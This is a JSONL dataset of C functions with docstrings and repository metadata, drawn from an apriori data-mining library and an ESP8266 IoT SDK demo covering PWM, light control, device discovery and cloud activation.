{"docstring": "/*----------------------------------------------------------------------\n  Functions\n----------------------------------------------------------------------*/\n", "func_signal": "TABSCAN* ts_create (void)", "code": "{                               /* --- create a table scanner */\n  TABSCAN *tsc;                 /* created table scanner */\n  int     i;                    /* loop variable */\n  char    *p;                   /* to traverse character flags */\n\n  tsc = (TABSCAN*)malloc(sizeof(TABSCAN));\n  if (!tsc) return NULL;        /* allocate memory and */\n  tsc->reccnt = 1;              /* initialize the fields */\n  tsc->delim  = TS_EOF;\n  for (p = tsc->cflags +256, i = 256; --i >= 0; )\n    *--p = '\\0';                /* initialize the character flags */\n  tsc->cflags['\\n'] = TS_RECSEP;\n  tsc->cflags['\\t'] = tsc->cflags[' '] = TS_BLANK|TS_FLDSEP;\n  tsc->cflags['\\r'] = TS_BLANK;\n  tsc->cflags[',']  = TS_FLDSEP;\n  tsc->cflags['?']  = tsc->cflags['*'] = TS_NULL;\n  tsc->cflags['#']  = TS_COMMENT;\n  return tsc;                   /* return created table scanner */\n}", "path": "ext\\util\\src\\tabscan.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
{"docstring": "/*--------------------------------------------------------------------*/\n", "func_signal": "void nst_spans (NSTATS *nst, double *vec)", "code": "{                               /* --- get spans of dimensions */\n  int    i;                     /* loop variable */\n  double *min, *max;            /* to traverse the ranges */\n\n  assert(nst && vec);           /* check the function arguments */\n  min = nst->mins;            \n  max = nst->maxs;              /* get the range variables, */ \n  for (i = nst->dim; --i >= 0;) /* traverse the dimensions, */ \n    vec[i] = max[i] -min[i];    /* and compute the spans */\n}", "path": "ext\\util\\src\\nstats.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
{"docstring": "/*--------------------------------------------------------------------*/\n", "func_signal": "static void error (int code, ...)", "code": "{                               /* --- print an error message */\n  #ifndef QUIET                 /* if not quiet version */\n  va_list    args;              /* list of variable arguments */\n  const char *msg;              /* error message */\n\n  assert(prgname);              /* check the program name */\n  if (code < E_UNKNOWN) code = E_UNKNOWN;\n  if (code < 0) {               /* if to report an error, */\n    msg = errmsgs[-code];       /* get the error message */\n    if (!msg) msg = errmsgs[-E_UNKNOWN];\n    fprintf(stderr, \"\\n%s: \", prgname);\n    va_start(args, code);       /* get variable arguments */\n    vfprintf(stderr, msg, args);/* print error message */\n    va_end(args);               /* end argument evaluation */\n  }\n  #endif\n  #ifndef NDEBUG                /* if debug version */\n  if (istree)  ist_delete(istree);   /* clean up memory */\n  if (tatree)  tat_delete(tatree);   /* and close files */\n  if (taset)   tas_delete(taset, 0);\n  if (itemset) is_delete(itemset);\n  if (in  && (in  != stdin))  fclose(in);\n  if (out && (out != stdout)) fclose(out);\n  #endif\n  #ifdef STORAGE                /* if storage debugging */\n  showmem(\"at end of program\"); /* check memory usage */\n  #endif\n  exit(code);                   /* abort the program */\n}", "path": "ext\\apriori_wrapper.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
{"docstring": "/*----------------------------------------------------------------------\n  Functions\n----------------------------------------------------------------------*/\n", "func_signal": "NSTATS* nst_create (int dim)", "code": "{                               /* --- create numerical statistics */\n  NSTATS *nst;                  /* created statistics structure */\n  double *p;                    /* to organize the memory */\n\n  assert(dim > 0);              /* check the function argument */\n  nst = (NSTATS*)malloc(sizeof(NSTATS) +(6*dim -1) *sizeof(double));\n  if (!nst) return NULL;        /* create a statistics structure */\n  nst->dim  = dim;              /* and initialize the fields */\n  nst->reg  = 0;\n  nst->offs = p = nst->facs +dim;\n  nst->mins = p += dim;\n  nst->maxs = p += dim;         /* organize the vectors */\n  nst->sums = p += dim;\n  nst->sqrs = p += dim;\n  while (--dim >= 0) {          /* traverse the vectors */\n    nst->mins[dim] = DBL_MAX; nst->maxs[dim] = -DBL_MAX;\n    nst->sums[dim] = nst->sqrs[dim] = nst->offs[dim] = 0;\n    nst->facs[dim] = 1;         /* initialize the ranges of values */\n  }                             /* and the aggregation variables */\n  return nst;                   /* return created structure */\n}", "path": "ext\\util\\src\\nstats.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
{"docstring": "/*--------------------------------------------------------------------*/\n", "func_signal": "int ts_decode (char const **s)", "code": "{                               /* --- decode ASCII character codes */\n  int c, code;                  /* character and character code */\n\n  assert(s && *s);              /* check the function arguments */\n  if (**s == '\\0')              /* if at the end of the string, */\n    return -1;                  /* abort the function */\n  c = (unsigned char)*(*s)++;   /* get the next character */\n  if (c != '\\\\')                /* if no quoted character, */\n    return c;                   /* simply return the character */\n  c = (unsigned char)*(*s)++;   /* get the next character */\n  switch (c) {                  /* and evaluate it */\n    case 'a': return '\\a';      /* 0x07 (BEL) */\n    case 'b': return '\\b';      /* 0x08 (BS)  */\n    case 'f': return '\\f';      /* 0x0c (FF)  */\n    case 'n': return '\\n';      /* 0x0a (NL)  */\n    case 'r': return '\\r';      /* 0x0d (CR)  */\n    case 't': return '\\t';      /* 0x09 (HT)  */\n    case 'v': return '\\v';      /* 0x0b (VT)  */\n    case '0': case '1': case '2': case '3':\n    case '4': case '5': case '6': case '7':\n      code = c -'0';            /* --- octal character code */\n      c    = **s;               /* get the next character */\n      if ((c >= '0') && (c <= '7')) code = (code << 3) +c -'0';\n      else return code;         /* decode second digit */\n      c    = *++(*s);           /* get the next character */\n      if ((c >= '0') && (c <= '7')) code = (code << 3) +c -'0';\n      else return c;            /* decode third digit */\n      (*s)++;                   /* consume the decoded character */\n      return code & 0xff;       /* and return the character code */\n    case 'x':                   /* --- hexadecimal character code */\n      c = **s;                  /* get the next character */\n      if      ((c >= '0') && (c <= '9')) code = c -'0';\n      else if ((c >= 'a') && (c <= 'f')) code = c -'a' +10;\n      else if ((c >= 'A') && (c <= 'F')) code = c -'A' +10;\n      else return 'x';          /* decode first digit */\n      c = *++(*s);              /* get the next character */\n      if      ((c >= '0') && (c <= '9')) code = (code << 4) +c -'0';\n      else if ((c >= 'a') && (c <= 'f')) code = (code << 4) +c -'a' +10;\n      else if ((c >= 'A') && (c <= 'F')) code = (code << 4) +c -'A' +10;\n      else return code;         /* decode second digit */\n      (*s)++;                   /* consume the decoded character */\n      return code;              /* and return the character code */\n    default:                    /* non-function characters */\n      if (**s == '\\0') return '\\\\';\n      else             return (unsigned char)*(*s)++;\n  }                             /* return character or backslash */\n}", "path": "ext\\util\\src\\tabscan.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
{"docstring": "/*--------------------------------------------------------------------*/\n", "func_signal": "void nst_center (NSTATS *nst, double *vec)", "code": "{                               /* --- get center of data space */\n  int    i;                     /* loop variable */\n  double *min, *max;            /* to traverse the ranges */\n\n  assert(nst && vec);           /* check the function arguments */\n  min = nst->mins;              /* get the range variables, */\n  max = nst->maxs;              /* traverse the dimensions, */\n  for (i = nst->dim; --i >= 0;) /* and compute the center vector */\n    vec[i] = 0.5 *(max[i] +min[i]);\n}", "path": "ext\\util\\src\\nstats.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
{"docstring": "/*--------------------------------------------------------------*/\n", "func_signal": "double intexp (double x, int n)", "code": "{                               /* --- raise x to the power of n */\n  double r = (n & 1) ? x : 1;   /* result */\n\n  for (n >>= 1; n > 0; n >>= 1) {\n    x *= x;                     /* traverse the powers of 2 and */\n    if (n & 1) r *= x;          /* multiply them into the result */\n  }                             /* if the corr. exponent bit is set */\n  return r;                     /* return the result */\n}", "path": "ext\\math\\src\\intexp.c", "repo_name": "jashmenn/apriori", "stars": 55, "license": "mit", "language": "c", "size": 4680}
{"docstring": "/******************************************************************************\n * FunctionName : pwm_period_timer\n * Description  : pwm period timer function, output high level,\n *                start each channel's high level timer\n * Parameters   : NONE\n * Returns      : NONE\n*******************************************************************************/\n", "func_signal": "LOCAL void ICACHE_FLASH_ATTR\npwm_period_timer(void)", "code": "{\n    uint8 i;\n\n    ETS_INTR_LOCK();\n\n    for (i = 0; i < PWM_CHANNEL; i++) {\n        if (pwm_single[i].h_time != 0) {\n            PWM_OUTPUT_HIGH(pwm_out_io_num[i]);\n\n            if (pwm_single[i].h_time != pwm_period.period) {\n                os_timer_disarm(&pwm_single[i].pwm_timer);\n                os_timer_arm_us(&pwm_single[i].pwm_timer, pwm_single[i].h_time, 0);\n            }\n        } else {\n            PWM_OUTPUT_LOW(pwm_out_io_num[i]);\n        }\n    }\n\n    ETS_INTR_UNLOCK();\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\driver\\pwm.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
{"docstring": "/******************************************************************************\n * FunctionName : user_esp_platform_reconnect\n * Description  : reconnect with host after get ip\n * Parameters   : pespconn -- the espconn used to reconnect with host\n * Returns      : none\n*******************************************************************************/\n", "func_signal": "LOCAL void ICACHE_FLASH_ATTR\nuser_esp_platform_reconnect(struct espconn *pespconn)", "code": "{\n    struct ip_info ipconfig;\n\n    ESP_DBG(\"user_esp_platform_reconnect\\n\");\n\n    wifi_get_ip_info(STATION_IF, &ipconfig);\n\n    if (ipconfig.ip.addr != 0) {\n        pespconn->proto.tcp->client_port = espconn_port();\n        user_esp_platform_connect(pespconn);\n    } else {\n        os_timer_arm(&client_timer, 10, 0);\n    }\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\user\\user_esp_platform.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
{"docstring": "/******************************************************************************\n * FunctionName : user_esp_platform_set_token\n * Description  : save the token for the espressif's device\n * Parameters   : token -- the parame point which write the flash\n * Returns      : none\n*******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR\nuser_esp_platform_set_token(uint8_t *token)", "code": "{\n    if (token == NULL) {\n        return;\n    }\n\n    esp_param.activeflag = 0;\n    os_memcpy(esp_param.token, token, os_strlen(token));\n    save_user_param(ESP_PARAM_SAVE_SEC, &esp_param, sizeof(struct esp_platform_saved_param));\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\user\\user_esp_platform.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
{"docstring": "/******************************************************************************\n * FunctionName : user_esp_platform_connect\n * Description  : The function given as the connect with the host\n * Parameters   : espconn -- the espconn used to connect the connection\n * Returns      : none\n*******************************************************************************/\n", "func_signal": "LOCAL void ICACHE_FLASH_ATTR\nuser_esp_platform_connect(struct espconn *pespconn)", "code": "{\n    ESP_DBG(\"user_esp_platform_connect\\n\");\n\n    espconn_connect(pespconn);\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\user\\user_esp_platform.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
{"docstring": "/******************************************************************************\n * FunctionName : pwm_set_freq\n * Description  : set pwm frequency\n * Parameters   : uint16 freq : 100hz typically\n * Returns      : NONE\n*******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR\npwm_set_freq(uint16 freq)", "code": "{\n    uint8 i;\n\n    if (freq > 500) {\n        pwm_period.freq = 500;\n    } else if (freq < 1) {\n        pwm_period.freq = 1;\n    } else {\n        pwm_period.freq = freq;\n    }\n\n    pwm_period.period = PWM_1S / pwm_period.freq;\n\n    for (i = 0; i < PWM_CHANNEL; i++) {\n        pwm_single[i].h_time  = pwm_period.period * pwm_single[i].duty / PWM_DEPTH;\n    }\n\n    os_timer_disarm(&pwm_period.pwm_timer);\n    os_timer_arm_us(&pwm_period.pwm_timer, pwm_period.period, 1);\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\driver\\pwm.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
{"docstring": "/******************************************************************************\n * FunctionName : user_esp_platform_sent\n * Description  : Processing the application data and sending it to the host\n * Parameters   : pespconn -- the espconn used to connetion with the host\n * Returns      : none\n*******************************************************************************/\n", "func_signal": "LOCAL void ICACHE_FLASH_ATTR\nuser_esp_platform_sent(struct espconn *pespconn)", "code": "{\n    uint8 devkey[token_size] = {0};\n    char *pbuf = (char *)os_zalloc(packet_size);\n\n    os_memcpy(devkey, esp_param.devkey, 40);\n\n    if (esp_param.activeflag == 0xFF) {\n        esp_param.activeflag = 0;\n    }\n\n    if (pbuf != NULL) {\n        if (esp_param.activeflag == 0) {\n            uint8 token[token_size] = {0};\n            uint8 bssid[6];\n\n            os_memcpy(token, esp_param.token, 40);\n\n            wifi_get_macaddr(STATION_IF, bssid);\n\n            os_sprintf(pbuf, ACTIVE_FRAME, token, devkey, MAC2STR(bssid));\n        }\n\n#if HUMITURE_DEVICE\n        else {\n            uint16 tp, rh;\n            uint8 data[4];\n\n            if (user_mvh3004_read_th(data)) {\n                rh = data[0] << 8 | data[1];\n                tp = data[2] << 8 | data[3];\n            }\n\n            os_sprintf(pbuf, UPLOAD_FRAME, count, (tp >> 2) * 165 / (16384 - 1) - 40, (rh & 0x3fff) * 100 / (16384 - 1), devkey);\n        }\n\n#else\n        else {\n            os_sprintf(pbuf, FIRST_FRAME, devkey);\n        }\n\n#endif\n        ESP_DBG(\"%s\\n\", pbuf);\n        espconn_sent(pespconn, pbuf, os_strlen(pbuf));\n        os_free(pbuf);\n    }\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\user\\user_esp_platform.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
{"docstring": "/******************************************************************************\n * FunctionName : user_light_init\n * Description  : light demo init, mainy init pwm\n * Parameters   : none\n * Returns      : none\n*******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR\nuser_light_init(void)", "code": "{\n    load_user_param(PRIV_PARAM_SAVE_SEC, &light_param, sizeof(struct light_saved_param));\n\n    pwm_init(light_param.pwm_freq, light_param.pwm_duty);\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\user\\user_light.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
{"docstring": "/******************************************************************************\n * FunctionName : user_esp_platform_connect_cb\n * Description  : A new incoming connection has been connected.\n * Parameters   : arg -- Additional argument to pass to the callback function\n * Returns      : none\n*******************************************************************************/\n", "func_signal": "LOCAL void ICACHE_FLASH_ATTR\nuser_esp_platform_connect_cb(void *arg)", "code": "{\n    struct espconn *pespconn = arg;\n\n    ESP_DBG(\"user_esp_platform_connect_cb\\n\");\n\n    espconn_regist_disconcb(pespconn, user_esp_platform_discon_cb);\n    espconn_regist_recvcb(pespconn, user_esp_platform_recv_cb);\n    espconn_regist_sentcb(pespconn, user_esp_platform_sent_cb);\n    user_esp_platform_sent(pespconn);\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\user\\user_esp_platform.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
{"docstring": "/******************************************************************************\n * FunctionName : user_devicefind_init\n * Description  : the espconn struct parame init\n * Parameters   : none\n * Returns      : none\n*******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR\nuser_devicefind_init(void)", "code": "{\n    ptrespconn.type = ESPCONN_UDP;\n    ptrespconn.proto.udp = (esp_udp *)os_zalloc(sizeof(esp_udp));\n    ptrespconn.proto.udp->_port = 1025;\n    espconn_regist_recvcb(&ptrespconn, user_devicefind_recv);\n    espconn_accept(&ptrespconn);\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\user\\user_devicefind.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
{"docstring": "/******************************************************************************\n * FunctionName : user_esp_platform_sent_cb\n * Description  : Data has been sent successfully and acknowledged by the remote host.\n * Parameters   : arg -- Additional argument to pass to the callback function\n * Returns      : none\n*******************************************************************************/\n", "func_signal": "LOCAL void ICACHE_FLASH_ATTR\nuser_esp_platform_sent_cb(void *arg)", "code": "{\n    struct espconn *pespconn = arg;\n\n    ESP_DBG(\"user_esp_platform_sent_cb\\n\");\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\user\\user_esp_platform.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
{"docstring": "/******************************************************************************\n * FunctionName : user_devicefind_recv\n * Description  : Processing the received data from the host\n * Parameters   : arg -- Additional argument to pass to the callback function\n *                pusrdata -- The received data (or NULL when the connection has been closed!)\n *                length -- The length of received data\n * Returns      : none\n*******************************************************************************/\n", "func_signal": "LOCAL void ICACHE_FLASH_ATTR\nuser_devicefind_recv(void *arg, char *pusrdata, unsigned short length)", "code": "{\n    char DeviceBuffer[40] = {0};\n    char hwaddr[6];\n\n    struct ip_info ipconfig;\n\n    if (wifi_get_opmode() != STATION_MODE) {\n        wifi_get_ip_info(SOFTAP_IF, &ipconfig);\n        wifi_get_macaddr(SOFTAP_IF, hwaddr);\n\n        if (!ip_addr_netcmp((struct ip_addr *)ptrespconn.proto.udp->ipaddr, &ipconfig.ip, &ipconfig.netmask)) {\n            wifi_get_ip_info(STATION_IF, &ipconfig);\n            wifi_get_macaddr(STATION_IF, hwaddr);\n        }\n    } else {\n        wifi_get_ip_info(STATION_IF, &ipconfig);\n        wifi_get_macaddr(STATION_IF, hwaddr);\n    }\n\n    if (pusrdata == NULL) {\n        return;\n    }\n\n    if (length == os_strlen(device_find_request) &&\n            os_strncmp(pusrdata, device_find_request, os_strlen(device_find_request)) == 0) {\n        os_sprintf(DeviceBuffer, \"%s\" MACSTR \" \" IPSTR, device_find_response_ok,\n                   MAC2STR(hwaddr), IP2STR(&ipconfig.ip));\n\n        length = os_strlen(DeviceBuffer);\n        espconn_sent(&ptrespconn, DeviceBuffer, length);\n    }\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\user\\user_devicefind.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
{"docstring": "/******************************************************************************\n * FunctionName : user_light_set_duty\n * Description  : set each channel's duty params\n * Parameters   : uint8 duty    : 0 ~ PWM_DEPTH\n *                uint8 channel : LIGHT_RED/LIGHT_GREEN/LIGHT_BLUE\n * Returns      : NONE\n*******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR\nuser_light_set_duty(uint8 duty, uint8 channel)", "code": "{\n    if (duty != light_param.pwm_duty[channel]) {\n        pwm_set_duty(duty, channel);\n\n        light_param.pwm_duty[channel] = pwm_get_duty(channel);\n    }\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\user\\user_light.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
{"docstring": "/******************************************************************************\n * FunctionName : user_esp_platform_discon\n * Description  : A new incoming connection has been disconnected.\n * Parameters   : espconn -- the espconn used to disconnect with host\n * Returns      : none\n*******************************************************************************/\n", "func_signal": "LOCAL void ICACHE_FLASH_ATTR\nuser_esp_platform_discon(struct espconn *pespconn)", "code": "{\n    ESP_DBG(\"user_esp_platform_discon\\n\");\n\n    espconn_disconnect(pespconn);\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\user\\user_esp_platform.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
{"docstring": "/******************************************************************************\n * FunctionName : user_esp_platform_discon_cb\n * Description  : disconnect successfully with the host\n * Parameters   : arg -- Additional argument to pass to the callback function\n * Returns      : none\n*******************************************************************************/\n", "func_signal": "LOCAL void ICACHE_FLASH_ATTR\nuser_esp_platform_discon_cb(void *arg)", "code": "{\n    struct espconn *pespconn = arg;\n\n    ESP_DBG(\"user_esp_platform_discon_cb\\n\");\n\n    if (pespconn == NULL) {\n        return;\n    }\n\n    pespconn->proto.tcp->client_port = espconn_port();\n\n#if HUMITURE_DEVICE\n    os_timer_disarm(&client_timer);\n    os_timer_setfn(&client_timer, (os_timer_func_t *)user_esp_platform_reconnect, pespconn);\n    os_timer_arm(&client_timer, 1000, 0);\n#else\n    user_esp_platform_reconnect(pespconn);\n#endif\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\user\\user_esp_platform.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
{"docstring": "/******************************************************************************\n * FunctionName : user_esp_platform_recon_cb\n * Description  : The connection had an error and is already deallocated.\n * Parameters   : arg -- Additional argument to pass to the callback function\n * Returns      : none\n*******************************************************************************/\n", "func_signal": "LOCAL void ICACHE_FLASH_ATTR\nuser_esp_platform_recon_cb(void *arg)", "code": "{\n    struct espconn *pespconn = (struct espconn *)arg;\n\n    ESP_DBG(\"user_esp_platform_recon_cb\\n\");\n\n    os_timer_disarm(&client_timer);\n    os_timer_setfn(&client_timer, (os_timer_func_t *)user_esp_platform_reconnect, pespconn);\n    os_timer_arm(&client_timer, 10000, 0);\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\user\\user_esp_platform.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
{"docstring": "/******************************************************************************\n * FunctionName : user_esp_platform_sent_beacon\n * Description  : sent beacon frame for connection with the host is activate\n * Parameters   : pespconn -- the espconn used to connetion with the host\n * Returns      : none\n*******************************************************************************/\n", "func_signal": "LOCAL void ICACHE_FLASH_ATTR\nuser_esp_platform_sent_beacon(struct espconn *pespconn)", "code": "{\n    if (pespconn == NULL) {\n        return;\n    }\n\n    if (pespconn->state == ESPCONN_CONNECT) {\n        if (esp_param.activeflag == 0) {\n            ESP_DBG(\"plese check device is activated.\\n\");\n            user_esp_platform_sent(pespconn);\n        } else {\n            uint8 devkey[token_size] = {0};\n            os_memcpy(devkey, esp_param.devkey, 40);\n            uint32 beacon_time = system_get_time();\n            ESP_DBG(\"user_esp_platform_sent_beacon %d\\n\", beacon_time);\n\n            if (beacon_time - current_time > BEACON_TIMEOUT) {\n                ESP_DBG(\"user_esp_platform_sent_beacon sent fail\\n\");\n                user_esp_platform_discon(pespconn);\n            } else {\n                char *pbuf = (char *)os_zalloc(packet_size);\n\n                if (pbuf != NULL) {\n                    os_sprintf(pbuf, BEACON_FRAME, devkey);\n                    espconn_sent(pespconn, pbuf, os_strlen(pbuf));\n                    os_timer_arm(&client_timer, BEACON_TIME, 0);\n                    os_free(pbuf);\n                }\n            }\n        }\n    }\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\user\\user_esp_platform.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
{"docstring": "/******************************************************************************\n * FunctionName : pwm_set_freq_duty\n * Description  : set pwm frequency and each channel's duty\n * Parameters   : uint16 freq : 100hz typically\n *                uint8 *duty : each channel's duty\n * Returns      : NONE\n*******************************************************************************/\n", "func_signal": "LOCAL void ICACHE_FLASH_ATTR\npwm_set_freq_duty(uint16 freq, uint8 *duty)", "code": "{\n    uint8 i;\n\n    if (freq > 500) {\n        pwm_period.freq = 500;\n    } else if (freq < 1) {\n        pwm_period.freq = 1;\n    } else {\n        pwm_period.freq = freq;\n    }\n\n    pwm_period.period = PWM_1S / pwm_period.freq;\n\n    for (i = 0; i < PWM_CHANNEL; i++) {\n        if (duty[i] < 1) {\n            pwm_single[i].duty = 0;\n        } else if (duty[i] >= PWM_DEPTH) {\n            pwm_single[i].duty = PWM_DEPTH;\n        } else {\n            pwm_single[i].duty = duty[i];\n        }\n\n        pwm_single[i].h_time  = pwm_period.period * pwm_single[i].duty / PWM_DEPTH;\n    }\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\driver\\pwm.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
{"docstring": "/******************************************************************************\n * FunctionName : user_esp_platform_check_ip\n * Description  : espconn struct parame init when get ip addr\n * Parameters   : none\n * Returns      : none\n*******************************************************************************/\n", "func_signal": "LOCAL void ICACHE_FLASH_ATTR\nuser_esp_platform_check_ip(void)", "code": "{\n    struct ip_info ipconfig;\n\n    wifi_get_ip_info(STATION_IF, &ipconfig);\n\n    if (ipconfig.ip.addr != 0) {\n        struct espconn *light_espconn = NULL;\n\n        light_espconn = (struct espconn *)os_zalloc(sizeof(struct espconn));\n\n        if (light_espconn != NULL) {\n            light_espconn->proto.tcp = NULL;\n            light_espconn->type = ESPCONN_TCP;\n            light_espconn->state = ESPCONN_NONE;\n            light_espconn->proto.tcp = (esp_tcp *)os_zalloc(sizeof(esp_tcp));\n\n            if (light_espconn->proto.tcp != NULL) {\n                const char sensor_ip[4] = {114, 215, 177, 97};\n\n                os_memcpy(light_espconn->proto.tcp->ipaddr, sensor_ip, 4);\n                light_espconn->proto.tcp->client_port = espconn_port();\n                light_espconn->proto.tcp->server_port = 8000;\n\n                espconn_regist_connectcb(light_espconn, user_esp_platform_connect_cb);\n                espconn_regist_reconcb(light_espconn, user_esp_platform_recon_cb);\n                user_esp_platform_connect(light_espconn);\n            }\n        }\n    } else {\n        os_timer_arm(&client_timer, 10, 0);\n    }\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\user\\user_esp_platform.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
{"docstring": "/******************************************************************************\n * FunctionName : user_esp_platform_recv_cb\n * Description  : Processing the received data from the server\n * Parameters   : arg -- Additional argument to pass to the callback function\n *                pusrdata -- The received data (or NULL when the connection has been closed!)\n *                length -- The length of received data\n * Returns      : none\n*******************************************************************************/\n", "func_signal": "LOCAL void ICACHE_FLASH_ATTR\nuser_esp_platform_recv_cb(void *arg, char *pusrdata, unsigned short length)", "code": "{\n    char *pstr = NULL;\n    LOCAL char pbuffer[1024 * 2] = {0};\n    struct espconn *pespconn = arg;\n\n    ESP_DBG(\"user_esp_platform_recv_cb %s\\n\", pusrdata);\n\n    os_timer_disarm(&client_timer);\n\n    if (length == 1024) {\n        os_memcpy(pbuffer, pusrdata, length);\n    } else {\n        struct espconn *pespconn = (struct espconn *)arg;\n\n        os_memcpy(pbuffer + os_strlen(pbuffer), pusrdata, length);\n\n        if ((pstr = (char *)os_strstr(pbuffer, \"\\\"activate_status\\\": \")) != NULL &&\n                user_esp_platform_parse_nonce(pbuffer) != 12306) {\n            if (os_strncmp(pstr + 19, \"1\", 1) == 0) {\n                ESP_DBG(\"device activates successful.\\n\");\n\n                esp_param.activeflag = 1;\n                save_user_param(ESP_PARAM_SAVE_SEC, &esp_param, sizeof(struct esp_platform_saved_param));\n\n                user_esp_platform_sent(pespconn);\n            } else {\n                ESP_DBG(\"device activates failed.\\n\");\n            }\n        }\n\n#if (PLUG_DEVICE || LIGHT_DEVICE)\n        else if ((pstr = (char *)os_strstr(pbuffer, \"\\\"method\\\": \")) != NULL) {\n            if (os_strncmp(pstr + 11, \"GET\", 3) == 0) {\n                user_esp_platform_get_info(pespconn, pbuffer);\n            } else if (os_strncmp(pstr + 11, \"POST\", 4) == 0) {\n                user_esp_platform_set_info(pespconn, pbuffer);\n            }\n\n            os_timer_arm(&client_timer, BEACON_TIME, 0);\n            current_time = system_get_time();\n            ESP_DBG(\"user_esp_platform_recv_cb %d\\n\", current_time);\n        } else if ((pstr = (char *)os_strstr(pbuffer, \"ping success\")) != NULL) {\n            ESP_DBG(\"ping success\\n\");\n            os_timer_arm(&client_timer, BEACON_TIME, 0);\n            current_time = system_get_time();\n            ESP_DBG(\"user_esp_platform_recv_cb %d\\n\", current_time);\n        }\n\n#elif HUMITURE_DEVICE\n        else if ((pstr = (char *)os_strstr(pbuffer, \"\\\"status\\\":\")) != NULL) {\n            if (os_strncmp(pstr + 10, \"200\", 3) != 0) {\n                ESP_DBG(\"message upload failed.\\n\");\n            } else {\n                count++;\n                ESP_DBG(\"message upload sucessful.\\n\");\n            }\n\n            os_timer_disarm(&client_timer);\n            os_timer_setfn(&client_timer, (os_timer_func_t *)user_esp_platform_discon, pespconn);\n            os_timer_arm(&client_timer, 10, 0);\n        }\n\n#endif\n        else if ((pstr = (char *)os_strstr(pbuffer, \"device\")) != NULL) {\n#if PLUG_DEVICE || LIGHT_DEVICE\n            os_timer_setfn(&client_timer, (os_timer_func_t *)user_esp_platform_sent_beacon, pespconn);\n            os_timer_arm(&client_timer, BEACON_TIME, 0);\n#elif HUMITURE_DEVICE\n\n#endif\n        }\n\n        os_memset(pbuffer, 0, sizeof(pbuffer));\n    }\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\user\\user_esp_platform.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
{"docstring": "/******************************************************************************\n * FunctionName : user_esp_platform_get_token\n * Description  : get the espressif's device token\n * Parameters   : token -- the parame point which write the flash\n * Returns      : none\n*******************************************************************************/\n", "func_signal": "void ICACHE_FLASH_ATTR\nuser_esp_platform_get_token(uint8_t *token)", "code": "{\n    if (token == NULL) {\n        return;\n    }\n\n    os_memcpy(token, esp_param.token, sizeof(esp_param.token));\n}", "path": "esp_iot_sdk_v0.6\\examples\\IoT demo\\user\\user_esp_platform.c", "repo_name": "scottjgibson/esp8266", "stars": 41, "license": "None", "language": "c", "size": 498}
